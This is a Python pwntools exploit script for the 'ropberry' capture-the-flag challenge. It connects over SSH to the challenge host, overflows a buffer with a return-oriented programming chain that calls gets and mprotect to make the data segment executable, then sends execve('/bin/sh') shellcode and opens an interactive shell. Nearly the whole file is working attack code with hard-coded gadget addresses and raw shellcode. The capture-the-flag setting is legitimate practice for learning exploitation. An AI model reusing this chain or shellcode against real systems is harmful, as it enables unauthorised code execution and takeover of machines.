from pwn import *
import time

binname = './ropberry'
context.binary = binname
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF(binname)
libc = elf.libc

gdbscript = '''
pwn
b *0x8048f10
b *0x80ed100
b *0x8049c10
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)

# io = process(binname)

# io = remote('localhost', 4088)

s = ssh('user', 'ropberry.ctf.insecurity-insa.fr', 2226, keyfile='./id_inshack')
io = s.run('/bin/sh')
# io = s.shell()

io.recv()

addr_pop = 0x08049a83
addr_pop2 = 0x080522f0
addr_pop3 = 0x08059578
addr_mprotect = 0x08058d40
addr_gets = 0x08049af0
addr_data = 0x80ed000 
addr_shellcode = addr_data + 0x500

# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"


rop = ''
# gets(addr_shellcode)
rop += p32(addr_gets)
rop += p32(addr_pop)
rop += p32(addr_data)


# mprotect(addr_data, 0x1000, addr_data)
rop += p32(addr_mprotect)
rop += p32(addr_pop3)
rop += p32(addr_data)
rop += p32(0x1000)
rop += p32(7)

# return to shellcode
rop += p32(addr_shellcode)


payload = 'A' * 0x8 + rop
# print hexdump(payload)
io.send(payload + '\n')

# print 'hit_enter'
# raw_input()

# print 'Send shellcode'
io.send(shellcode + '\n')


io.interactive()
